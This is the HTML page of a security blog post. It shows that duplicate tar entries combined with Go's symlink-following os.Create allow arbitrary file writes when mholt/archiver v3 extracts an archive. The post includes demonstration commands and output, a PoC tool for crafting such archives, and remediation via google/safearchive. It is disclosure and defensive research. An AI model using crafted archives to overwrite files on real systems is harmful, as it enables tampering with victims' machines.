@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Sweet combination: Link-write Attack during extraction | Nody´s blog</title>
+<meta name="keywords" content="attack, tar">
+<meta name="description" content="I have recently done some development work and deep-dived into archive extraction. I identified during that work interesting behaviors which I will explain in the following.">
+<meta name="author" content="Jan Harrie">
+<link rel="canonical" href="//localhost:1313/posts/link-write-attack/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="//localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="//localhost:1313/posts/link-write-attack/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="//localhost:1313/" accesskey="h" title="Nody´s blog (Alt + H)">Nody´s blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="//localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/posts/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Sweet combination: Link-write Attack during extraction
+    </h1>
+    <div class="post-meta"><span title='2024-08-09 08:20:35 +0200 CEST'>August 9, 2024</span>&nbsp;·&nbsp;Jan Harrie
+
+</div>
+  </header> 
+  <div class="post-content"><p>I have recently done some development work and deep-dived into archive extraction. I identified during that work interesting behaviors which I will explain in the following.</p>
+<p><em><strong>TL;DR:</strong></em> Tar archives can contain multiple entries with the same filename. Golang follows symlinks while calling <a href="https://pkg.go.dev/os#Create"><code>os.Create(name string) (*File, error)</code></a>. The combination can lead to arbitrary writes during file extraction.</p>
+<h2 id="observations">Observations<a hidden class="anchor" aria-hidden="true" href="#observations">#</a></h2>
+<h3 id="repeating-name-in-tar-files">Repeating name in tar files<a hidden class="anchor" aria-hidden="true" href="#repeating-name-in-tar-files">#</a></h3>
+<p>First of all, an archive can contain multiple entries with the same name. Lets take for example the tar file <code>alice.tar</code> (created with <a href="https://go.dev/play/p/7TjHUzQLuL8">ref</a>). The file contains two entries:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ tar ztvf alice.tar
+</span></span><span style="display:flex;"><span>lrw-------  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span> Jan  <span style="color:#ae81ff">1970</span> rabbit_hole -&gt; /tmp/wonderland
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>          <span style="color:#ae81ff">39</span>  <span style="color:#ae81ff">1</span> Jan  <span style="color:#ae81ff">1970</span> rabbit_hole
+</span></span></code></pre></div><p>The first entry is a symlink, the second is a legit text file. If this archive is extracted with the <code>tar</code> cli, the symlink  is extracted and afterwards replaced by the text file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ tar xvf alice.tar
+</span></span><span style="display:flex;"><span>x rabbit_hole
+</span></span><span style="display:flex;"><span>x rabbit_hole
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ ls -l
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> jan  staff   2,5K  <span style="color:#ae81ff">9</span> Aug 17:33 alice.tar
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> jan  staff    39B  <span style="color:#ae81ff">1</span> Jan  <span style="color:#ae81ff">1970</span> rabbit_hole
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ file rabbit_hole
+</span></span><span style="display:flex;"><span>rabbit_hole: ASCII text, with no line terminators
+</span></span></code></pre></div><p>Let&rsquo;s keep that behavior for now in mind and let us step to the next interesting observation.</p>
+<h3 id="file-creation-in-golang">File creation in Golang<a hidden class="anchor" aria-hidden="true" href="#file-creation-in-golang">#</a></h3>
+<p>Files can be created in Golang with <a href="https://pkg.go.dev/os#Create"><code>os.Create(name string) (*File, error)</code></a>. Subsequently data can be written into the <code>File</code> and finally be closed. The <a href="https://pkg.go.dev/os#Create:~:text=Create%20creates%20or%20truncates%20the%20named%20file.%20If%20the%20file%20already%20exists%2C%20it%20is%20truncated.%20If%20the%20file%20does%20not%20exist%2C%20it%20is%20created%20with%20mode%200666%20(before%20umask).">documentation states following</a>:</p>
+<blockquote>
+<p>Create creates or truncates the named file. If the file already exists, it is truncated. If the file does not exist, it is created with mode 0666 (before umask).</p>
+</blockquote>
+<p>The interesting thing about that function is that the provided <code>name</code> can also be an already existing file (or even better: a symlink!). My first expectation was that the symlink will be replaced/truncated and replaced with the file content – similar to the <code>tar</code> behavior.</p>
+<p>I implemented such behaviors in <a href="https://go.dev/play/p/kunYCVn-_Zp">Golang</a> and in <a href="https://www.online-python.com/WAhSH75ia2">Python</a> and it revealed that if we provide a symlink to the create function, the symlink gets traversed and the content is written to the destination!</p>
+<p>Funny, right? 😃</p>
+<h2 id="verification-of-assumption">Verification of assumption<a hidden class="anchor" aria-hidden="true" href="#verification-of-assumption">#</a></h2>
+<p>To verify my assumption, I picked a wide-spread existing OSS extraction implementation for archives in Golang – <a href="https://github.com/mholt/archiver/tree/v3-deprecated">mholt/archiver@v3</a> – which is straightforward to use (<a href="https://go.dev/play/p/NPqSWEOWphV">full code example</a>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-golang" data-lang="golang"><span style="display:flex;"><span><span style="color:#75715e">// parse command line arguments
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">input</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Args</span>[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">output</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Args</span>[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// unarchive the file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">archiver</span>.<span style="color:#a6e22e">Unarchive</span>(<span style="color:#a6e22e">input</span>, <span style="color:#a6e22e">output</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// print the result
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Unarchived %s to %s\n&#34;</span>, <span style="color:#a6e22e">input</span>, <span style="color:#a6e22e">output</span>)
+</span></span></code></pre></div><p>If we use this simple code snipped to extract our previous crafted archive, we get following result:</p>
+<pre tabindex="0"><code>$ go run ./main.go alice.tar .
+Unarchived alice.tar to .
+
+$ ls -l
+total 24
+[...]
+-rw-r--r--  1 jan  staff   299B  9 Aug 18:31 main.go
+lrwxr-xr-x  1 jan  staff    15B  9 Aug 18:38 rabbit_hole@ -&gt; /tmp/wonderland
+
+$ cat /tmp/wonderland
+Hello Alice, welcome to the wonderland!
+</code></pre><p>So, we are capable of archiving an arbitrary write to the filesystem, by traversing the link during the file creation process.</p>
+<h2 id="poc-tool-golinkwrite">PoC tool: golinkwrite<a hidden class="anchor" aria-hidden="true" href="#poc-tool-golinkwrite">#</a></h2>
+<p>If you want to create a potential malicious archive, feel free to use <a href="https://github.com/NodyHub/golinkwrite">NodyHub/golinkwrite</a> to craft your own tar archives with double entries:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;Hello Alice :wave:!&#39;</span> | tee rabbit_hole.txt
+</span></span><span style="display:flex;"><span>Hello Alice :wave:!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ golinkwrite -v rabbit_hole.txt /tmp/hi.txt alice.tar
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">=</span>2024-08-09T19:11:35.266+02:00 level<span style="color:#f92672">=</span>DEBUG msg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;command line  parameters&#34;</span> cli<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{Input:rabbit_hole.txt Target:/tmp/hi.txt Output:alice.tar Verbose:true}&#34;</span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">=</span>2024-08-09T19:11:35.266+02:00 level<span style="color:#f92672">=</span>DEBUG msg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input permissions&#34;</span> perm<span style="color:#f92672">=</span>-rw-r--r--
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">=</span>2024-08-09T19:11:35.266+02:00 level<span style="color:#f92672">=</span>DEBUG msg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input size&#34;</span> size<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">=</span>2024-08-09T19:11:35.266+02:00 level<span style="color:#f92672">=</span>INFO msg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tar file created&#34;</span> output<span style="color:#f92672">=</span>alice.tar
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ tar ztvf alice.tar
+</span></span><span style="display:flex;"><span>lrw-r--r--  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span> Jan  <span style="color:#ae81ff">1970</span> rabbit_hole.txt -&gt; /tmp/hi.txt
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>          <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">1</span> Jan  <span style="color:#ae81ff">1970</span> rabbit_hole.txt
+</span></span></code></pre></div><h2 id="remedition">Remedition<a hidden class="anchor" aria-hidden="true" href="#remedition">#</a></h2>
+<p>The root-cause of this behavior is that symlinks are traversed during the extraction. You could ether implement your own checks or leverage the implementation from Google: <a href="https://github.com/google/safearchive">google/safearchive</a> to ensure that symlinks from an archived are not traversed during extraction. Further details can be found in the blogpost <a href="https://bughunters.google.com/blog/4925068200771584/the-family-of-safe-golang-libraries-is-growing">The Family of Safe Golang Libraries is Growing!</a>.</p>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="//localhost:1313/tags/attack/">Attack</a></li>
+      <li><a href="//localhost:1313/tags/tar/">Tar</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="//localhost:1313/">Nody´s blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
